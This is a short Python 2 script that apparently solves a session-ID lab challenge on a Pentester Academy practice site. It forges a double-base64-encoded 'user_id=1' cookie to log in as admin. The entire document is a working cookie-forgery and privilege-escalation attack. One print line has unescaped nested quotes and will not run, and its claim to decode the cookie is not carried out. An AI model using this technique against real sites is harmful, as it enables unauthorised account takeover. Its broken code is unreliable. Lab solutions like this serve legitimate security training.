#!/usr/bin/python

import requests
import base64
from termcolor import colored

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/sid/2"
print colored("[*]Request The URL and Search the Header For Cookie ... ","yellow")
print colored("[*]SessionID Analysis ... ","yellow")

Login = requests.get(url_base)
Cookie = Login.headers.get('set-cookie').split('=')[1]

print colored("[*]Decoding The Cookie Vlaue "%s" ... "%Cookie,"yellow")
print colored("[*]Set The Cookie Value = 10xx","yellow")

Admin = "1"
Encode = base64.b64encode(base64.b64encode(Admin))
Cookie_Value = "user_id=%s" %Encode
Custome_header = {'Cookie': Cookie_Value }

print colored("[*]Try Login as Admin ... ","yellow")
Login = requests.get(url_base, headers = Custome_header)

if Login.text.find("Guest") == -1:
	print colored("[*]Well done!This challenge has been cracked! ... ","green")
else:
	print colored("[*]Try Harder ... ","red")
